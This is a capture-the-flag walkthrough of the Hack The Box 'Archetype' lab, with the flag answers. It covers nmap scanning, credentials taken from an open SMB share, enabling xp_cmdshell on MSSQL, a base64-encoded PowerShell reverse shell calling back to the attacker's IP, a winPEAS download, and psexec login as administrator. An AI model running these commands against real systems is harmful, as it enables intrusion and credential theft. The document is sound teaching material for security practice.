
# Starting Point / Archetype

**About:** Archetype is a very easy Windows machine that features a misconfigured Microsoft SQL server, exposed SMB shares and sensitive data exposure. An exposed SMB share can be accessed without authentication in which sensitive files can be found containing plaintext credentials. These credentials can be used to authenticate to MSSQL as the service account user through Impacket's mssqlclient tool. Command execution can then be achieved by enabling xp_cmdshell after which a reverse shell can be uploaded and triggered to get access to the host. Finally, WinPeas can be used to search for vulnerabilities which reveals a Powershell history file containing the password needed to achieve full privilege escalation.

**Target:** `10.129.95.187`

---

## Task 1 - Which TCP port is hosting a database server?

Step 1 always: nmap
- Standard flags: `-sV` for service versioning, `-p-` to scan all ports, and `-T5` because this is HTB and i am impatient:

```bash
nmap -sV -p- 10.129.95.187 -T5

PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
1433/tcp  open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  msrpc        Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
```

**Answer:** `1433`

---

## Task 2 - What is the name of the non-Administrative share available over SMB?

Step 2 always: more nmap:
- This time with the `-sC` flag to run some builtin NSE scripts targeted at the open SMB port:

```bash
nmap -sC -p445 10.129.95.187 -T5

Host script results:
| smb-os-discovery: 
|   OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)
|   Computer name: Archetype
|   NetBIOS computer name: ARCHETYPE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2026-05-30T18:51:13-07:00
|_clock-skew: mean: 2h20m01s, deviation: 4h02m31s, median: 0s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-05-31T01:51:11
|_  start_date: N/A
```

Guest account was used, now i can list the shares with `netexec`:

```bash
netexec smb 10.129.95.187 -u guest -p '' --shares

SMB         10.129.95.187   445    ARCHETYPE        [*] Windows Server 2019 Standard 17763 x64 (name:ARCHETYPE) (domain:Archetype) (signing:False) (SMBv1:True) (Null Auth:True)
SMB         10.129.95.187   445    ARCHETYPE        [+] Archetype\guest: 
SMB         10.129.95.187   445    ARCHETYPE        [*] Enumerated shares
SMB         10.129.95.187   445    ARCHETYPE        Share           Permissions     Remark
SMB         10.129.95.187   445    ARCHETYPE        -----           -----------     ------
SMB         10.129.95.187   445    ARCHETYPE        ADMIN$                          Remote Admin
SMB         10.129.95.187   445    ARCHETYPE        backups         READ            
SMB         10.129.95.187   445    ARCHETYPE        C$                              Default share
SMB         10.129.95.187   445    ARCHETYPE        IPC$            READ            Remote IPC
```

backups is non-standard

**Answer:** `backups`

---

## Task 3 - What is the password identified in the file on the SMB share?

Connect to the share, and get the file:

```bash
smbclient //10.129.95.187/backups -N

Try "help" to get a list of possible commands.

smb: \> dir
  .                                   D        0  Mon Jan 20 07:20:57 2020
  ..                                  D        0  Mon Jan 20 07:20:57 2020
  prod.dtsConfig                     AR      609  Mon Jan 20 07:23:02 2020

		5056511 blocks of size 4096. 2616629 blocks available
smb: \> get prod.dtsConfig
getting file \prod.dtsConfig of size 609 as prod.dtsConfig (2.4 KiloBytes/sec) (average 2.4 KiloBytes/sec)
```

What does the file say?

```bash
cat prod.dtsConfig 
<DTSConfiguration>
    <DTSConfigurationHeading>
        <DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/>
    </DTSConfigurationHeading>
    <Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String">
        <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
    </Configuration>
</DTSConfiguration>                                                                                                                             
```

Cool, user: `ARCHETYPE\sql_svc`, password: `M3g4c0rp123`

**Answer:** `M3g4c0rp123`

---

## Task 4 - What script from Impacket collection can be used in order to establish an authenticated connection to a Microsoft SQL Server?

Could go about this a few ways, but i used `locate` to look for impacket dirs:

```bash
locate -r "impacket$"                      
/usr/lib/python3/dist-packages/impacket
/usr/share/impacket
/usr/share/doc/python3-impacket
/usr/share/doc/metasploit-framework/modules/auxiliary/scanner/smb/impacket
/usr/share/metasploit-framework/modules/auxiliary/scanner/smb/impacket
/usr/share/responder/tools/MultiRelay/impacket-dev/impacket
```

And then looked in doc examples:

```bash
ls /usr/share/doc/python3-impacket/examples
addcomputer.py      exchanger.py        GetUserSPNs.py    netview.py        regsecrets.py   sniff.py
atexec.py           filetime.py         goldenPac.py      ntfs-read.py      rpcdump.py      split.py
attrib.py           findDelegation.py   karmaSMB.py       ntlmrelayx.py     rpcmap.py       ticketConverter.py
badsuccessor.py     GetADComputers.py   keylistattack.py  owneredit.py      sambaPipe.py    ticketer.py
changepasswd.py     GetADUsers.py       kintercept.py     ping6.py          samedit.py      tstool.py
CheckLDAPStatus.py  getArch.py          lookupsid.py      ping.py           samrdump.py     wmiexec.py
dacledit.py         Get-GPPPassword.py  machine_role.py   psexec.py         secretsdump.py  wmipersist.py
dcomexec.py         GetLAPSPassword.py  mimikatz.py       raiseChild.py     services.py     wmiquery.py
describeTicket.py   GetNPUsers.py       mqtt_check.py     rbcd.py           smbclient.py
dpapi.py            getPac.py           mssqlclient.py    rdp_check.py      smbexec.py
DumpNTLMInfo.py     getST.py            mssqlinstance.py  registry-read.py  smbserver.py
esentutl.py         getTGT.py           net.py            reg.py            sniffer.py
```

Only two mssql scripts stand out:

**Answer:** `mssqlclient.py`


---

## Task 5 - What extended stored procedure of Microsoft SQL Server can be used in order to spawn a Windows command shell?

https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver17

**Answer:** `xp-cmdshell`

---

## Task 6 - What script can be used in order to search possible paths to escalate privileges on Windows hosts?

In the name:

```bash
peass

> peass ~ Privilege Escalation Awesome Scripts SUITE

/usr/share/peass/
├── linpeas
│   ├── linpeas_darwin_amd64
│   ├── linpeas_darwin_arm64
│   ├── linpeas_fat.sh
│   ├── linpeas_linux_386
│   ├── linpeas_linux_amd64
│   ├── linpeas_linux_arm
│   ├── linpeas_linux_arm64
│   ├── linpeas.sh
│   └── linpeas_small.sh
└── winpeas
    ├── winPEASany.exe
    ├── winPEASany_ofs.exe
    ├── winPEAS.bat
    ├── winPEAS.ps1
    ├── winPEASx64.exe
    ├── winPEASx64_ofs.exe
    ├── winPEASx86.exe
    └── winPEASx86_ofs.exe
```

**Answer:** `winpeas`

---

## Task 7 - What file contains the administrator's password?

At first it wasn't working and was confused:

```bash
impacket-mssqlclient ARCHETYPE/sql_svc:M3g4c0rp123@10.129.95.187     

Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[-] ERROR(ARCHETYPE): Line 1: Login failed for user 'sql_svc'.
```
Then I did some research and the `-windows-auth` option allows for windows/domain auth:
- `-windows-auth         whether or not to use Windows Authentication (default False)`

```bash
impacket-mssqlclient ARCHETYPE/sql_svc:M3g4c0rp123@10.129.95.187 -windows-auth

Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(ARCHETYPE): Line 1: Changed database context to 'master'.
[*] INFO(ARCHETYPE): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2017 RTM (14.0.1000)
[!] Press help for extra shell commands

SQL (ARCHETYPE\sql_svc  dbo@master)> 
```
Now I'll peruse:

```bash
SQL (ARCHETYPE\sql_svc  dbo@master)> SELECT name  FROM sys.databases;
name     
------   
master   
tempdb   
model    
msdb     

SQL (ARCHETYPE\sql_svc  dbo@master)> SELECT name  FROM sys.tables;
name                    
---------------------   
spt_fallback_db         
spt_fallback_dev        
spt_fallback_usg        
spt_monitor             
MSreplication_options
```

Attempted to execute commands, but to do this I had to enable `xp_cmdshell` from Task 5:

Ref:
- https://www.mssqltips.com/sqlservertip/1020/enabling-xpcmdshell-in-sql-server/

```bash
SQL (ARCHETYPE\sql_svc  dbo@master)> EXEC sp_configure 'show advanced options', '1'
INFO(ARCHETYPE): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.

SQL (ARCHETYPE\sql_svc  dbo@master)> RECONFIGURE
SQL (ARCHETYPE\sql_svc  dbo@master)> EXEC sp_configure 'xp_cmdshell', '1' 
INFO(ARCHETYPE): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.

SQL (ARCHETYPE\sql_svc  dbo@master)> RECONFIGURE
SQL (ARCHETYPE\sql_svc  dbo@master)> xp_cmdshell dir
output                                                                             
--------------------------------------------------------------------------------   
 Volume in drive C has no label.                                                   
 Volume Serial Number is 9565-0B4F                                                 
                                                                           
 Directory of C:\Windows\system32                                                  
                                                                          
05/31/2026  04:38 PM    <DIR>          .                                           
05/31/2026  04:38 PM    <DIR>          ..                                          
09/15/2018  02:06 AM    <DIR>          0409                                        
01/19/2020  04:09 PM    <DIR>          1033                                        
09/15/2018  12:09 AM               404 @VpnToastIcon.png                           
09/15/2018  12:09 AM               518 @WindowsUpdateToastIcon.contrast-black.png   
09/15/2018  12:09 AM               810 @WindowsUpdateToastIcon.contrast-white.png   
09/15/2018  12:09 AM               518 @WindowsUpdateToastIcon.png                 
07/26/2021  09:22 AM           314,368 AcLayers.dll                                
09/15/2018  12:09 AM         5,504,000 aclui.dll                                   
.......
```
Now I can run commands, and then setup a reverse shell (https://www.revshells.com/ -- took a little troubleshooting, but PS#3 Base64 worked):
```powershell
SQL (ARCHETYPE\sql_svc  dbo@master)> xp_cmdshell powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMgA1ADMAIgAsADYAOQA2ADkAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
```
Connection secured, establish dominance:

```bash
nc -lvnp 6969 
listening on [any] 6969 ...
connect to [10.10.14.253] from (UNKNOWN) [10.129.95.187] 49694

PS C:\Windows\system32> whoami
archetype\sql_svc
```

Then I'll push winPEAS.bat with a simple py http server:
Refs:
- https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7.6
- https://realpython.com/python-http-server/

```bash
python3 -m http.server 80

Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.95.187 - - [31/May/2026 21:23:43] "GET /winPEAS.bat HTTP/1.1" 200 -
```

```powershell
PS C:\Windows\system32> cd C:\Users\sql_svc
PS C:\Users\sql_svc> iwr http://10.10.14.253/winPEAS.bat -OutFile winPEAS.bat
PS C:\Users\sql_svc> dir

    Directory: C:\Users\sql_svc
    
Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-r---        1/20/2020   5:01 AM                3D Objects                                                            
d-r---        1/20/2020   5:01 AM                Contacts                                                              
d-r---        1/20/2020   5:42 AM                Desktop                                                               
d-r---        1/20/2020   5:01 AM                Documents                                                             
d-r---        1/20/2020   5:01 AM                Downloads                                                             
d-r---        1/20/2020   5:01 AM                Favorites                                                             
d-r---        1/20/2020   5:01 AM                Links                                                                 
d-r---        1/20/2020   5:01 AM                Music                                                                 
d-r---        1/20/2020   5:01 AM                Pictures                                                              
d-r---        1/20/2020   5:01 AM                Saved Games                                                           
d-r---        1/20/2020   5:01 AM                Searches                                                              
d-r---        1/20/2020   5:01 AM                Videos                                                                
-a----        5/31/2026   6:23 PM          39630 winPEAS.bat      

PS C:\Users\sql_svc> .\winPEAS.bat
```

40 hours later:

```bash
            ((,.,/((((((((((((((((((((/,  */
     ,/*,..*(((((((((((((((((((((((((((((((((,
   ,*/((((((((((((((((((/,  .*//((//**, .*((((((*
   ((((((((((((((((* *****,,,/########## .(* ,((((((
   (((((((((((/* ******************/####### .(. ((((((
   ((((((..******************/@@@@@/***/###### /((((((
   ,,..**********************@@@@@@@@@@(***,#### ../(((((
   , ,**********************#@@@@@#@@@@*********##((/ /((((
   ..(((##########*********/#@@@@@@@@@/*************,,..((((
   .(((################(/******/@@@@@#****************.. /((
   .((########################(/************************..*(
   .((#############################(/********************.,(
   .((##################################(/***************..(
   .((######################################(************..(
   .((######(,.***.,(###################(..***(/*********..(
   .((######*(#####((##################((######/(********..(
   .((##################(/**********(################(**...(
   .(((####################/*******(###################.((((
   .(((((############################################/  /((
   ..(((((#########################################(..(((((.
   ....(((((#####################################( .((((((.
   ......(((((#################################( .(((((((.
   (((((((((. ,(############################(../(((((((((.
       (((((((((/,  ,####################(/..((((((((((.
             (((((((((/,.  ,*//////*,. ./(((((((((((.
                (((((((((((((((((((((((((((/
                       by carlospolop
```

And then the rest of the logs, but here are the important parts:

```powershell
 [+] Files in registry that may contain credentials
   [i] Searching specific files that may contains credentials.
   [?] https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#files-and-registry-credentials
......
Looking inside HKCU\Software\OpenSSH\Agent\Keys
C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
......
---
Scan complete.

PS C:\Users\sql_svc> more C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
exit
```

**Answer:** `ConsoleHost_history.txt`

---

## User Flag - Submit the flag located on the sql_svc user's desktop.

whale whale whale

```bash
PS C:\Users\sql_svc> more Desktop/user.txt  
3e7b102e78218e935bf3f4951fec21a3
```

**Answer:** `3e7b102e78218e935bf3f4951fec21a3`

---

## Root Flag - Submit the flag located in root's home directory.

Username: administrator
Password: MEGACORP_4dm1n!!

i'll use impacket-psexec:

```bash
impacket-psexec administrator@10.129.95.187
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Password:  MEGACORP_4dm1n!!
[*] Requesting shares on 10.129.95.187.....
[*] Found writable share ADMIN$
[*] Uploading file RkCvvjLw.exe
[*] Opening SVCManager on 10.129.95.187.....
[*] Creating service IAzv on 10.129.95.187.....
[*] Starting service IAzv.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.2061]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> dir C:\Users\administrator\Desktop
 Volume in drive C has no label.
 Volume Serial Number is 9565-0B4F

 Directory of C:\Users\administrator\Desktop

07/27/2021  02:30 AM    <DIR>          .
07/27/2021  02:30 AM    <DIR>          ..
02/25/2020  07:36 AM                32 root.txt
               1 File(s)             32 bytes
               2 Dir(s)  10,717,941,760 bytes free

C:\Windows\system32> more C:\Users\administrator\Desktop\root.txt
b91ccec3305e98240082d4474b848528
```

**Answer:** `b91ccec3305e98240082d4474b848528`
